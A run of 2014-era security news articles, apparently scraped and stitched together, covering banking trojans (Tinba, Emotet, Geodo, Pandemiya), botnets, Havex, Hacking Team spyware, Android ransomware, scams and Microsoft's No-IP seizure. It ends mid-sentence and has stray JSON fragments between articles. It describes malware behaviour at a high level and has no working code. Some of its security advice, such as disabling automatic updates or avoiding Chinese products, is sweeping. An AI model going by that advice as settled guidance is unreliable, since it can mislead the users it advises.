The files posted on the closed russian underground forum turned out to be the source code of Tinba version1, which was discovered around mid-2012 and they say it is the original, privately sold version of the crimeware kit that infected thousands of computers in Turkey. Tinba, also known as Zusy, is a tiny but deadly banking Trojan that comprises just 20 Kilobytes of code that gives it ability to slip past detection by some antivirus engines and uses a number of well-word man-in-the-browser tricks in an attempt to defeat two-factor authentication. It infects systems without any advanced encryption or packing and has capability to hook into browsers and steal login data and sniff on network traffic. Last week, researchers at CSIS in Denmark found a post in an underground cybercrime forum that contained an attachment that turned out to be the source code for Tinba, and after analyzing and investigating the files, CSIS got to know that the source code found was for version one of Tinba banking trojan. The leaked source code would be a golden opportunity for those who always look for these kind of opportunity as these types of malware programs are only offered for sale in underground forums. Researchers believe that the source code of the malware was likely sold, modified and improved by other attackers. Despite the older version of the banking Trojan, it works without any difficulties. Members of the closed underground forum can download the source code of Tinda version 1 for free of cost. “So, our research on this malware and the group behind it proves to have been correct. Sometimes around 2012, the Tinba version 1 source code was taken over by new criminals and it is precisely the version 1 source code which has now been made available to the public and not the code being used in current and ongoing attacks,” Peter Kruse, security specialist at CSIS, said in a blog post. “The Tinba leaked source code comes with a complete documentation and full source code. It is nicely structured and our initial analysis proves that the code works smoothly and compiles just fine.” The source code for an online banking Trojan, very well known as Zeus, was leaked in 2011, which also opened up an opportunity for a wider range of cybercriminals to develop more sophisticated and powerful commercial crimeware-kits. “We don't expect the source code of Tinba to become a major inspiration for IT-criminals as it was the case for ZeuS. However, making the code public increases the risk of new banker Trojans to arise based partially on Tinba source code,” Kruse said." }

This time not for any scam or surveillance, but for a different reason. The social networking giant has managed to take down a Greek botnet that used Facebook to spread malware and infected 250,000 computers to mine crypto-currencies, steal bitcoins, email passwords and banking details. Facebook is always one of the favourite weapon of cyber criminals, cyber thieves and scammers due to its popularity among other social media platforms. This social networking platform, with more than one billion active users, provides special opportunities for people to connect and share information, as well as also serves a great platform for malware developers and scammers. The botnet, dubbed as Lecpetex, was around from December 2013 to last month and compromised around 50,000 Facebook accounts at its peak, under which users would receive spam Facebook messages that would typically like \"lol\" with a zip archive attachment. Once the attachment is opened, it would execute an embedded Java archive file that would download Lecpetex main module and install a program to begin Litecoin mining secretly on the infected computer, and at the same time, other malware sent out from the botnet would steal bitcoins, email passwords and internet banking details. Moreover, the module would download and run the Facebook spamming module that would hijack user’s account by stealing cookies from their browser in an effort to gain access to the victim's Facebook friend list so that it could further send out more spam messages to each friend with a zip file containing malware. The Lecpetex botnet infect computers with family of different malware, including the DarkComet remote access trojan, through simple social engineering techniques, and the operators behind it were constantly modifying it in order to evade detection, both by Facebook's attachment scanning software as well as anti-virus software. Security researchers at Menlo Park said the 31 and 27 year-old botnet creators delivered over 20 distinct spam campaigns, affecting users in Greece, Poland, Norway, India, Portugal, and the US. Not even the malware targeted Facebook alone, the malware was also delivered through torrent files containing pirated content like movies, games and MP3s to trick unwitting downloaders, but this was not observed by Facebook bods. \"On April 30, 2014, we escalated the Lecpetex case to the Cybercrime Subdivision of the Greek Police, and the agency immediately showed strong interest in the case,\" Facebook engineers wrote in an unauthored post. After five months of examination, irritated botnet creators began leaving messages for Facebook engineers from their command and control servers saying that: \"Hello people.. :) but am not the f***ing zeus bot/skynet bot or whatever piece of sh*t.. no fraud here.. only a bit of mining. Stop breaking my ballz..\" They also changed their crypto keys to the phrase 'IdontLikeLecpetexName'. But Facebook didn’t stop its investigation and continued to target botnet with new countermeasures and automated tools in order to extract more information from the botnet to trace its creators, and finally the Greek Police arrested two hackers last week, a 31-year-old and a 27-year-old who were both informatics students. \"According to the Greek Police, the authors were in the process of establishing a Bitcoin 'mixing' service to help launder stolen Bitcoins at the time of their arrest,\" said Facebook. “Ultimately, remediating a threat like Lecpetex requires a combination of technical analysis capabilities, industry collaboration, agility in deploying new countermeasures, and law enforcement cooperation.\" The Greek Reporter says that the Lecpetex operation is the biggest case ever handled by Greece's Cyber Crime Unit." }

Geodo, a new version of the infamous Cridex (also known as Feodo or Bugat) banking information stealing Trojan works in conjunction with a worm that sends out emails automatically to continue its self-spreading infection method, effectively turning each infected Windows system in the botnet for infecting new targets, Seculert warned. The Infected Windows systems in the botnet network download and install an additional piece of malware (i.e. an email worm) from the Botnet's command and control servers, provided with approximately 50,000 stolen SMTP account credentials including those of the associated SMTP servers. The stolen SMTP credentials appeared to come from Cridex victims and with the help of those credentials, the malware then sends out emails from legitimate accounts to other potential victims, masquerading itself as a bank or financial organization, in an effort to continue its spread and majority of targets (over 46%) mostly belongs to Germany. “The C&C provides the malware with a batch of 20 targeted email addresses.The malware is also given a from address, subject line, and email body text unique to this particular batch of emails. Once the malware has run through the batch, it is provided with a new batch of 20 emails. And with each new batch of emails the C&C also sends a new from address, subject line, and body.” \"The emails we have seen, written in German, contain a link prompting the recipient to download a zip file which contains an executable disguised as a PDF document,\" Seculert explains in a blog post published yesterday. \"By opening the file, Geodo [new version of Cridex] is installed on the newly infected endpoint, adding a new bot to the mix.” Cridex is a banking worm that targets banks from around the world. It was traditionally been distributed via removable drives, or a malicious file dropped by other malware or unknowingly download of a file by users when visiting malicious sites. After infection, when the user connects to his banking website, the variant malware selects the malicious code designed specifically for that bank and injects it into the user’s browser. Ultimately, the injected script will attempt a money transfer. Previous variants of Geodo are still targeting victims primarily from Germany, Austria, Hungary and the United States using phishing attack. Phishing mails include a link to download a zip file containing the malware disguised as an invoice or Shipment PDF file. Malware that steals banking credentials has been a known problem for years, but now the threat is delivered directly to users from the email addresses of other innocent users, which has capability to spread by itself and compromises the intellectual property of a corporation, putting its business and reputation at risk." }

Nowadays, organizations in the energy sector have become an interesting target for cyber minds. Few days ago, security researchers uncovered a Stuxnet-like malware, “Havex”, which was also programmed to infect industrial control system software of SCADA systems, with the capability to possibly disable hydroelectric dams, overload nuclear power plants, and even shut down a country’s power grid with a single keystroke. RUSSIAN HACKERS HIT 1000 ENERGY FIRMS Recently, a Russian group of hackers known as 'Energetic Bear' has compromised over 1,000 European and North American energy firms with a sophisticated cyber weapon, similar to Stuxnet, that gave hackers access to power plant control systems, said a security firm. The group of hackers also known as 'Dragonfly', an eastern European collective that has been active since at least 2011 and has been using phishing sites and Trojans to target energy supplier organizations in the US and several other countries, since 2013. \"Its primary goal appears to be espionage,\" claimed Symantec. The group appears to have the resources, size and organization that no doubt suggest the involvement of government in the malware campaign, said the firm. According to the blog post published yesterday by security firm Symantec, Dragonfly group mainly targeted petroleum pipeline operators, electricity generation firms and other Industrial Control Systems (ICS) equipment providers for the energy sector in several companies. SABOTAGE OPERATIONSince 2013, Dragonfly has been targeting organizations that make use of Industrial Control Systems (ICS) to manage electrical, water, oil, gas and data systems, which affected almost 84 countries in a campaign spanning 18 months, although most of the victims were located in the United States, Spain, France, Italy, Germany, Turkey, and Poland.“Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus mainly to US and European energy firms in early 2013,” reads the blog post. “Dragonfly bears the hallmarks of a state-sponsored operation, displaying a high degree of technical capability.”ATTACK VECTORSDragonfly used different techniques to infect industrial software with Remote Access Trojan (RAT) in order to access computer systems, including attaching malware to emails, websites and third-party programs, giving it \"the capability to mount sabotage operations that could have disrupted energy supplies across a number of European countries\".“The attackers, known to Symantec as Dragonfly, managed to compromise a number of strategically important organizations for spying purposes,” Symantec said in a blog post. “If they had used the sabotage capabilities open to them, (they) could have caused damage or disruption to energy supplies in affected countries.”DRAGONFLY LINKED TO HAVEX, A STUXNET-LIKE WORMDragonfly used two hacking outfit, the first one is Backdoor.Oldrea which is used to gather system information, including the computers' Outlook address book and a list of files and programs installed, and the second one is Trojan.Karagany which is used to upload stolen data, download new files and run them on infected computers, the firm said. The Oldrea backdoor is also known as Havex, about which we reported few days ago. In short, both Oldrea and Karagany malware families allow cyber criminals to gain backdoor access of the infected systems, as well as to exfiltrate confidential data and, download and install additional malware to the systems. The first powerful malware of this family is the famous Stuxnet Worm, which made international headlines in 2010 and was designed to sabotage the Iranian nuclear project. It specifically targeted a uranium enrichment facility to make the centrifuges spin out of control and cause physical damage to the plant in Natanz, Iran and successfully disabled 1,000 centrifuges that the Iranians were using to enrich uranium." }

Millions of legitimate servers that rely on Dynamic Domain Name Service (DDNS) from No-IP.com, owned by Vitalwerks Internet Solutions were blacked out on Monday after Microsoft seized their 23 domain names that were being used by malware developed in the Middle East and Africa. No-IP FOR MALWARE OPERATORS The Dynamic Domain Name Service (DDNS) from No-IP.com works by mapping users' dynamic IP addresses to a customized No-IP sub-domain like yourhost.no-ip.org or yourhost.no-ip.biz. This mechanism allows users to connect to a system with dynamic IP address using a static No-IP sub-domain. No doubt its a useful service, but Nevada-based No-IP Dynamic DNS (DDNS) service subdomains have been abused by creators of malware for infecting millions of computers with malicious software at large scale. FAMOUS MALWARE FAMILIES USING No-IP SERVICE Microsoft security research team began this operation under an order granted by a federal court in Nevada, and targeted traffic involving two malware families that abused No-IP services. The Windows malwares, which went by the names Bladabindi (aka NJrat) and Jenxcus (aka NJw0rm), use No-IP accounts to communicate with their creators in 93 percent of detected infections, which are the most prevalent among the 245 other pieces of malware currently exploiting No-IP domains. In a blog post, Richard Domingues Boscovich, assistant general counsel at Microsoft’s Digital Crimes Unit, said Microsoft pursued the seizure for No-IP's role \"in creating, controlling, and assisting in infecting millions of computers with malicious software—harming Microsoft, its customers and the public at large.\" He claimed. LARGE SCALE MALWARE INFECTION AND ACCUSED AUTHORS Over the past year, Microsoft security team has detected more than 7 million infections that makes use of Bladabindi and Jenxcus malware, in order to take control of users’ computers, steal passwords, and turn on webcams and microphones. Microsoft accused Kuwaiti national Naser Al Mutairi and Algerian national Mohamed Benabdellah of writing and distributing the Bladabindi and Jenxcus malware, respectively. Microsoft claims the developers have sold over 500 copies of the malicious software to crooks and cyber criminals, and promoted No-IP service to use with malware to help them covering their tracks. In a civil case filed on June 19, Microsoft named two individuals, Mohamed Benabdellah and Naser Al Mutairi, and a U.S. company, Vitalwerks Internet Solutions of violating “federal and state law by distributing malicious software through more than 18,000 sub-domains belonging to No-IP, causing the unlawful intrusion into, infection of, and further illegal conduct involving, the personal computers of innocent persons, thereby causing harm to those persons, Microsoft, and the public at large.\" Microsoft attorneys said No-IP is \"functioning as a major hub for 245 different types of malware circulating on the Internet.\" The court in Nevada has granted a temporary controlling order against No-IP and now the DNS traffic for the hostnames associated with malicious activity being funneled through Microsoft's servers: ns7.microsoftinternetsafety.net ns8.microsoftinternetsafety.net MICROSOFT vs No-IP SERVICE Microsoft claimed, \"Despite numerous reports by the security community on No-IP domain abuse, the company has not taken sufficient steps to correct, remedy, prevent or control the abuse or help keep its domains safe from malicious activity.\". In an official statement, Vitalwerks counter-accused Microsoft for allegedly affecting millions of innocent users, who are currently experiencing outages to their services because of Microsoft’s attempt to remediate hostnames associated with a few bad actors. “Unfortunately, Microsoft never contacted us or asked us to block any subdomains, even though we have an open line of communication with Microsoft corporate executives.” No-IP Marketing Manager, Natalie Goguen said. “Vitalwerks and No­-IP have a very strict abuse policy. Our abuse team is constantly working to keep the No-­IP system domains free of spam and malicious activity.” Natalie Goguen said. “Even with such precautions, our free dynamic DNS service does occasionally fall prey to cyber scammers, spammers, and malware distributors. But this heavy-handed action by Microsoft benefits no one.” OTHER POPULAR No-IP LIKE SERVICES There are dozens of No-IP like Free Dynamic Domain Name Services (DDNS) available the Internet, those are actively being used by malware authors/operators to distribute malwares. Example: http://www.dnsdynamic.org/ http://www.changeip.com/ http://freedns.afraid.org/ http://www.dyndns.com/ and many more… Microsoft advised all of them to follow the Industry best security practices, in order to make it more difficult for cybercriminals to operate anonymously and harder to victimize people online. Boscovich went on to say, \"As malware authors continue to pollute the Internet, domain owners must act responsibly by monitoring for and defending against cyber crime on their infrastructure. If free Dynamic DNS providers like No-IP exercise care and follow industry best practices, it will be more difficult for cybercriminals to operate anonymously and harder to victimize people online.\" However, No-IP has not created the malware, but the service has not taken strict steps to keep its domains safe from malicious activity. Microsoft said the case and operation is ongoing. Stay Tuned for more updates." }

Another Facebook scam is circulating across the social networking website just a day before the former “Saturday Night Live” and “30 Rock” star Tracy Morgan was critically hurt in a six-vehicle fatal accident on the New Jersey Turnpike that killed his friend and writer 62-year-old James McNair. With the rise in various scams on the popular social networking giant, Facebook that has more than one billion active users, it became very clear that not only does the social networking platform provide special opportunities for people to connect and share information, but serves as a great platform for scammers as well. TOTAL SCAM LEADS TO MALWARE Scammers spare no incident to target as many victims as possible, and this time they made use of this roadway accident to target users by spreading the fake Facebook videos proclaiming the death of Tracy Morgan. Malwarebytes warned about the Morgan video scam, saying that the fake video tricks users into sharing it that are spreading throughout the social network, with the Title, “[Death Video] R.I.P. Tracy Morgan died few minutes ago in hospital.” Once clicked, users are directed to share the fake videos and along with the video sharing, the spam leads users to download a file, which could be anything from a Potentially Unwanted Program (PUP) to a malicious software that could steal users’ sensitive or financial information from the infected system. TRACY MORGAN DEAD? RUMORS REACHED TWITTER AS WELL In response to this false news, people began tweeting that Tracy had passed away on June 10. The fake news spread like fire on the internet. Following are the tweets by his Fans: JUST IGNORE IT “Pay no attention to scammy and sensational sounding videos appearing on your Facebook feed and stick to trusted news sources for breaking stories and information,” warned Malwarebytes. “Surveys are always a pain, but scam sites offering up random redirects always carry the potential to be even more problematic – you simply never know where you’re going to end up.” We have seen various suspicious posts on Facebook, like \"See your Friend's naked video\", an app offering you a chance to see who has viewed your Facebook profile, and many more. Sometimes these scams are very obvious and easily avoidable, but many times they are irresistible and easy to fall for, like this new fake video scam. SCAMS AT RISE, SO BE SAFE With more tech skills, modern scammers have ability to reach billions of potential victims with just a single message or post, and their scams are getting more dangerous and critical day-by-day. Despite Facebook's security measures, safe and secured social networking rests in your own hands and if you aren't paying attention to such scams, you could fall for one such even without ever realizing. So, if you are served with any suspicious link or post, do not try to click on it, no matter even if it’s from your closest friend." }

Until now, we have seen banking Trojans affecting devices and steal users’ financial credentials in order to run them out of their money. But nowadays, malware authors are adopting more sophisticated techniques in an effort to target as many victims as possible. BANKING MALWARE WITH NETWORK SNIFFING Security researchers from the Anti-virus firm Trend Micro have discovered a new variant of banking malware that not only steals users’ information from the device it has infected but, has ability to “sniff” network activity in an effort to compromise the devices of same network users as well. The banking malware, dubbed as EMOTET spreads rapidly through spammed emails that masquerade itself as a bank transfers and shipping invoices. The spammed email comes along with an attached link that users easily click, considering that the emails refer to their bank or financial transactions. Once clicked, the malware get installed into users’ system that further downloads its component files, including a configuration and .DLL file. The configuration files contains information about the banks targeted by the malware, whereas the .DLL file is responsible for intercepting and logging outgoing network traffic. The .DLL file is injected to all processes of the system, including web browser and then “this malicious DLL compares the accessed site with the strings contained in the previously downloaded configuration file, wrote Joie Salvio, security researcher at Trend Micro. “If strings match, the malware assembles the information by getting the URL accessed and the data sent.” ENCRYPTED STOLEN DATA Meanwhile, the malware stores stolen data in the separate entries after been encrypted, which means the malware can steal and save any information the attacker wants. \"The decision to storing files and data in registry entries could be seen as a method of evasion\", Salvio said. \"Regular users often do not check registry entries for possibly malicious or suspicious activity, compared to checking for new or unusual files. It can also serve as a countermeasure against file-based AV detection for that same reason.\" HTTPS CONNECTIONS KICKED Moreover, the malware has ability to even bypass the secure HTTPs connection which poses more danger to users’ personal information and banking credentials, as users will feel free to continue their online banking without even realizing that their information is being stolen. “[It has] capability to hook to the following Network APIs to monitor network traffic: PR_OpenTcpSocket PR_Write PR_Close PR_GetNameForIndentity Closesocket Connect Send WsaSend” This kind of financial threat is really dangerous for the people, because previous banking malwares often rely on form field insertion or phishing pages to steal users’ financial information, but the use of network sniffing in the malware, makes the threat even more harder for users to detect any suspicious activity as no changes are visibly seen, said the researcher. Researchers are still investigating that how the malware sends the gathered data sniffed from the network to the attacker. MALWARE DISTRIBUTION OVER WORLD MAP The malware infection is not targeted to any specific region or country but, EMOTET malware family is largely infecting the users of EMEA region, i.e. Europe, the Middle East and Africa, with Germany on the top of the affected countries. Users are advised to do not open or click on links and attachments provided in any suspicious email, but if the message is from your banking institution and of concern to you, then confirm it twice before proceeding." }

Just like Famous Stuxnet Worm, which was specially designed to sabotage the Iranian nuclear project, the new trojan Havex is also programmed to infect industrial control system softwares of SCADA and ICS systems, with the capability to possibly disable hydroelectric dams, overload nuclear power plants, and even can shut down a country’s power grid with a single keystroke. According to security firm F-Secure who first discovered it as Backdoor:W32/Havex.A., it is a generic remote access Trojan (RAT) and has recently been used to carry out industrial espionage against a number of companies in Europe that use or develop industrial applications and machines. SMARTY PANTS, TROJANIZED INSTALLERS To accomplish this, besides traditional infection methods such as exploit kits and spam emails, cybercriminals also used an another effective method to spread Havex RAT, i.e. hacking the websites of software companies and waiting for the targets to install trojanized versions of legitimate apps. During installation, the trojanized software setup drops a file called \"mbcheck.dll\", which is actually Havex malware, that attackers are using as a backdoor. “The C&C server will [then] instruct infected computers to download and execute further components,” “We gathered and analyzed 88 variants of the Havex RAT used to gain access to, and harvest data from, networks and machines of interest. This analysis included investigation of 146 command and control (C&C) servers contacted by the variants, which in turn involved tracing around 1500 IP addresses in an attempt to identify victims.” F-Secure said. F-secure didn't mention the names of the affected vendors, but an industrial machine producer and two educational organizations in France, with companies in Germany were targeted. INFORMATION GATHERING Havex RAT is equipped with a new component, whose purpose is to gather network and connected devices information by leveraging the OPC (Open Platform Communications) standard. OPC is a communications standard that allows interaction between Windows-based SCADA applications and process control hardware. The malware scans the local network for the devices that respond to OPC requests to gather information about industrial control devices and then sends that information back to its command-and-control (C&C) server. Other than this, it also include information-harvesting tools that gather data from the infected systems, such as: Operating system related information A Credential-harvesting tool that stole passwords stored on open web browsers A component that communicates to different Command-&-Control servers using custom protocols and execute tertiary payloads in memory. “So far, we have not seen any payloads that attempt to control the connected hardware.” F-secure confirmed. MOTIVATION? While their motivation is unclear at this point, “We also identified an additional component used by the attackers that includes code to harvest data from infected machines used in ICS/SCADA systems. This indicates that the attackers are not just interested in compromising the networks of companies they are interested in, but are also motivated in having control of the ICS/SCADA systems in those organizations.” F-Secure noticed. HAVEX TROJAN FROM RUSSIANS ? In January this year, Cybersecurity firm CrowdStrike revealed about a cyber espionage campaign, dubbed \"Energetic Bear,\" where hackers possibly tied to Russian Federation penetrating the computer networks of energy companies in Europe, the United States and Asia. According to CrowdStrike, the Malwares used in those cyber attacks were HAVEX RAT and SYSMain RAT, and possibly HAVEX RAT is itself a newer version of the SYSMain RAT, and both tools have been operated by the attackers since at least 2011. That means, It is possible that Havex RAT could be somehow linked to Russian hackers or state-sponsored by Russian Government." }

Yes, the police forces around the World are following the footsteps of U.S. National Security Agency (NSA) and FBI. Researchers from the Citizen Lab at the Munk School of Global Affairs at the University of Toronto and computer security firm Kaspersky Lab have unearthed a broad network of controversial spyware which is specially designed to give law enforcement agencies complete access to a suspect's phone for the purpose of surveillance. MALWARE FOR DESKTOPS AND ALL MOBILE DEVICESThe malware, dubbed as Remote Control System (RCS), also known as Da Vinci and Galileo, is developed by an Italian company known as Hacking Team, available for desktop computers, laptops, and mobile devices. The latest version of the malware works for all phone including Android, iOS, Windows Mobile, Symbian and BlackBerry devices, but best on Android devices, and can also be installed on jailbroken iOS devices. But even if the targeted iOS device is not jailbroken, the malware uses the famous Evasi0n jailbreaking tool to install the malware easily. The team of researchers from both Citizen Lab and Kaspersky Lab in collaboration has presented their findings during an event in London. According to the report published, the diameter of the command infrastructure supporting Hacking Team, which sells the RCS to governments and law enforcement, is very vast with 326 command-and-control (C&C) servers running in more than 40 countries. MALWARE DEVELOPERS - ‘HACKING TEAM’ Hacking Team is a Milan-based IT company with more than 50 employees that has made a totally different place for itself selling \"offensive\" intrusion and surveillance software to governments and law enforcement agencies in \"several dozen countries\" on \"six continents.\" “It was a well-known fact for quite some time that the HackingTeam products included malware for mobile phones. However, these were rarely seen,” said Kaspersky Lab experts on the blog post. “In particular, the Android and iOS Trojans have never been identified before and represented one of the remaining blank spots in the story.” WORLD WIDE WEB OF COMMAND-N-CONTROL SERVERSKaspersky Lab researchers have used a fingerprinting method to scan the entire IPv4 space and to identify the IP addresses of RCS Command & Control servers around the world and found the biggest host in United States with 64 counts of C&C servers. Next on the list was Kazakhstan with 49, Ecuador has 35, UK which hosts 32 control systems and many other countries with a grand total of 326 Command & Control servers.\"The presence of these servers in a given country doesn't mean to say they are used by that particular country's law enforcement agencies,\" said Sergey Golovanov, principal security researcher at Kaspersky Lab. \"However, it makes sense for the users of RCS to deploy C&Cs in locations they control – where there are minimal risks of cross-border legal issues or server seizures.\"ATTACK VECTOR AND MALWARE FEATURESRCS can be physically implanted on the victim’s device through a USB or SD card, and remotely it can be installed through spear phishing, exploit kits, drive-by downloads or network traffic injection. Once installed on Apple iOS and Android device, the new module enable governments and law enforcement officers with larger capabilities to monitor victim devices, including the ability to:control phone network steal data from their device record voice E-mail intercept SMS and MMS messages obtain call history report on their location use the device’s microphone in real time intercept voice and SMS messages sent via applications such as Skype, WhatsApp, Viber, and much more. \"Secretly activating the microphone and taking regular camera shots provides constant surveillance of the target—which is much more powerful than traditional cloak and dagger operations,\" Golovanov wrote.While, the Android module is protected by an optimizer for Android called DexGuard that made the it extremely difficult to analyze. However, most of the iOS capabilities mentioned above are also available for Android, along with the support for hijacking applications such Facebook, Google Talk, Tencent of China and many more. The mobile modules for each are custom-built for each target, researchers said. From previous disclosures we have seen that RCS is currently being used to spy on political dissidents, journalists, human rights advocates, and opposing political figures." }

Simplocker (Android/Simplocker.A) is the latest Android ransomware that has ability to encrypt the files using Advanced Encryption Standard (AES) on the Android device SD cards demanding users pay a ransom of 260 UAH (Ukrainian hryvnias), which is roughly equal to $21 US, for those files to be decrypted. To hide their track, the malware author is using the Command-and-Control server hosted on TOR .onion domain, which makes it difficult to trace the server's physical location or determine who is operating it. The malware collects information about the users’ phone such as IMEI number, Operating System, phone model and manufacturer to send it all to Command-and-Control server. STUDENT CRACKS SIMPLOCKER RANSOMWARE Now, an undergraduate student Simon Bell from the University of Sussex promises to release a Java application to decrypt the files encrypted by the so-called first Android File-encrypting and TOR-enabled Mobile Ransomware. In a technical blog, Secure Honey published Monday, the student has given a detailed explanation on how to reverse Simplocker Ransomware and develop an app to pluck the decryption keys stored within. \"This dissection shows how the app encrypts user's files and that information about the phone is sent to a C&C (command and control) server on the TOR network,\" Bell writes. \"But one important question remains unanswered: would it be possible to decrypt files that have been encrypted by the app without connecting to the C&C server? In other words: can we reverse the damage done by this app?\" Bell detailed the Static and Dynamic analysis of the Ransomware code and found a method called decrypt() which is very similar to the encrypt() method. “Obviously this method carries out the decryption on the input file and produces the decrypted output file,” he said. “The same line numbers from the encrypt() method are highlighted to demonstrate how decryption occurs.” In his next blog, he’ll publish the crypto-cracking app allowing victims to free their devices from the nasty Ransomware without paying any ransom fine. We have seen many similar threat such as CryptoLocker, CryptoWall and PrisonLocker ransomware targeting users Worldwide, but the only difference is that first they were targeting PCs and now with the popularity of Android platform, they are targeting Smartphones. But to keep yourself away from such emerging threats, it is always important for you to keep the back-up of all your files either manually on the computer system or with the use of cloud backup services like Dropbox, Google drive etc. We'll update you the antidote for this ransomware as soon as he get it done.

A popular Chinese Android Smartphone comes pre-installed with a Trojan that could allow manufacturer to spy onto their users’ comprising their personal data and conversations without any restrictions and users knowledge. GOOGLE PLAY STORE OR A SPYING APP? According to the researchers at the German security firm G Data, the Star N9500 smartphone, a popular and cheap handset device in China, comes pre-installed with Uupay.D Trojan horse, disguising as a version of the Google Play Store. The trojan camouflage as the Google Play Store, so it enables Chinese Company to secretly install malicious apps, which creates the whole spectrum of abuse. STEALING WITHOUT RESTRICTIONS The nasty Spyware runs in the background and has capability to steal personal information, copy users’ data, record calls automatically with unlimited time and send costly SMS to premium services, thereby sending all the stolen information to an anonymous server based in China. The malware is also capable to activate the microphone on users’ smartphone at any time in order to turn users’ smartphone into a bugging device that allows hackers to hear anything you are saying near by the phone. “The spy function is invisible to the user and cannot be deactivated,” reads the blog post published yesterday. “This means that online criminals have full access to the smartphone and all personal data. Logs that could make an access visible to the users are deleted directly.” REMOVAL OF THE TROJAN NOT POSSIBLE In addition, the malicious software allow preventing security updates from being downloaded and one can not disable the program. “The program also blocks the installation of security updates,” claimed G Data. Moreover, it is not possible to uninstall the trojan because it is embedded in the firmware of the Star-phone device. \"Unfortunately, removing the Trojan is not possible as it is part of the device's firmware and apps that fall into this category cannot be deleted,” said Christian Geschkat, Product Manager at G Data. “This includes the fake Google Play Store app of the N9500.\" CHEAP PRICE ATTRACTS USERS The Star N9500 ​​is an affordable copy of the Samsung Galaxy S4, which can be easily found at various online retailers such as eBay and Amazon for 130 to 165 euros and is also equipped with a variety of accessories, such as a second battery, car charger adapter and a second cover. But considering the high technological standard of device, the low price comes as a surprise and the security researchers at G DATA believe that it is the cheap price of the mobile device that has made possible by the subsequent selling of data records stolen from the smartphone owner. HOW TO CHECK IF YOU’RE AFFECTED We recommend you to download an up-to-date Mobile Anti-virus software and scan your device for the trojan and if found return the device back from where you purchased. Avoid buying Chinese and cheap products in order to keep your privacy and personal information away from the hands of cyber criminals and prying eyes." }

Soccer or Football is the most popular sport in the world with billions of fans who don’t even miss a single tournament. Now, this is the most awaited and rejoicing atmosphere for Football fans as well as cybercriminals right now. For bad actors, the World Cup is a perfect opportunities to scam people online. While you are busy figuring out websites where you can stream live Fifa Matches on your PCs without missing a single moment of the world cup tournament, cyber criminals are also busy to launch phishing attacks in form of scams and malwares in order to victimize the system by several Trojans and viruses. This isn't surprising as cyber criminals have become smart enough to gain from every possible eventuality they get and their prior/common target is every time the users’ interest based major news and current events. The most popular threat this World Cup targets users in the form of phishing attacks. You may see links in messages over emails and social networking sites serving attractive contents of this World Cup such as Free Tickets, merchandise, news and footage of highlights, online streaming videos of footballers behaving badly and many more. But once clicked, the victims are redirected to the malicious websites that trick users into revealing their private information or installing malicious softwares in order to put their computer systems at risk of malwares and viruses infection or identity theft. Researchers at the security software maker firm, Symantec, have identified several email scams and in coming days, they also expects to see these scam attempts targeting Soccer fans on social networks as well. #1 FREE TICKETS TO WORLD CUP The most common scam is Free Tickets to World Cup 2014. In this Football fevered atmosphere, everyone is seeking to get a free pass or a ticket to the tournament in Brazil and What if you won an all-expenses paid trip to Brazil? It’s really like a dream comes true for any Soccer fan. The security firm has identified several emails that contain a malicious zip file and inside it is an executable file. Once executed, it will allow your computer to be taken over by Trojans and remote administration tools. #2 NEWS AND HIGHLIGHTS OF WORLD CUP TEAMS AND PLAYERS Apart from free tickets, news and highlights about different World Cup teams and players can also be used to thwart users into opening up malicious attachments or clicking malicious links. Researchers have discovered emails that are currently circulating about Neymar da Silva Santos Júnior, a young star player with the Brazilian national team. The email have a malicious word document that could exploit a known vulnerability in the victims’ Microsoft Word. #3 FREE ONLINE STREAMS OF FIFA WORLD CUP MATCHES Once the FIFA World Cup begins, cyber criminals starts targeting users by emails and social networks’ scams that claim to provide free live stream of various matches. Before you can unlock access to the live stream, it first ask you to fill out a survey or download and install software in order to fetch money from your pockets. HOW TO PROTECT FROM WORLD CUP SCAMS If you are served any link for free tickets to World Cup, consider it as a scam because free stuffs are never free. If you have to watch live World Cup match, check your local service providers to see where and when you can catch World Cup games online. Avoid unknown sources to know happenings of your favorite teams and players; visit only official news websites. If any site ask you for password or credit card information, double check it before proceeding. Beware of links that either lead you to any application or external Website. Make sure you have installed an updated Anti-virus solution to avoid latest threats." }

Google narrows down Android's 145 permissions into 13 broad categories and groups app permissions into 'groups of related permissions', likely for Android users to have an easier time dealing with app permissions. Unfortunately, the new update has introduced a few potential security and privacy issues, as listed below: hiding permissions behind the group names auto-updating app with no warning for new permissions According to new update, once a user approves an app’s permissions, he actually approves the whole respective permission groups. For example, if an app want to read your incoming SMS messages, then it requires the “Read SMS messages” permission. But now installing an app, you are actually giving it access to all SMS-related permissions. The app developer can then include additional permissions from ‘SMS-related permissions Group’, in a future update, which will not trigger any warning before installation. Google explains, “If you have automatic updates enabled, you won't need to review or accept these permissions as long as they are included in a permissions group you already accepted for that app.” If your Android apps update automatically, then malicious developers can gain access to new dangerous permissions without your knowledge by abusing this mechanism, though a smart user could manually view all permissions in a dropdown before installation, but one out of thousands does that. For example, as you can see in the above screenshots - I am installing FIFA's android app from Google Play Store and before installation the app is asking for group permissions in left image and actual group permissions are expanded in the right-side image. Similarly, if you install any app with group permissions to read contacts, later that app can secretly gain permission to add or even change calendar entries too. Below I have listed some most abused Android app permissions that cyber criminals are exploiting for their personal gain: GPS Location and Network-based Location Read Phone State and Identity Automatically Start at Boot Modify/Delete SD Card Contents Read/Send SMS Messages Read/Modify Contacts I strongly recommend users to disable automatic updates and verify app permissions manually every time an app wants to update." }

Researchers at RSA Security’s FraudAction team have discovered this new and critical threat, dubbed as ‘Pandemiya’, which is being offered to the cyber criminals in underground forums as an alternative to the infamous Zeus Trojan and its many variants, that is widely used by most of the cyber-criminals for years to steal banking information from consumers and companies. The source code of the Zeus banking Trojan is available on the underground forums from past few years, which lead malware developers to design more sophisticated variants of Zeus Trojan such as Citadel, Ice IX and Gameover Zeus. But, Pandemiya is something by far the most isolated and dangerous piece of malware as the author spent a year in writing the code for Pandemiya, which includes 25,000 lines of original code written in C. Like other commercial Trojan, Pandemiya infect the machines through exploit kits and via drive-by download attacks to boost infection rate that exploit flaws in the vulnerable software such as Java, Silverlight and Flash within few seconds victim lands on the web page. “Pandemiya’s coding quality is quite interesting, and contrary to recent trends in malware development, it is not based on Zeus source code at all, unlike Citadel/Ice IX, etc.,” researchers from RSA, the security division of EMC, said Tuesday in a blog post. “Through our research, we found out that the author of Pandemiya spent close to a year of coding the application, and that it consists of more than 25,000 lines of original code in C.” Pandemiya Trojan using Windows CreateProcess API to inject itself into every new process that is initiated, including Explorer.exe and re-injects itself when needed. Pandemiya is being sold for as much as $2,000 USD and provides all the nasty features including encrypted communication with command and control servers in an effort to evade detection. The Trojan has been designed with modular architecture to load more external 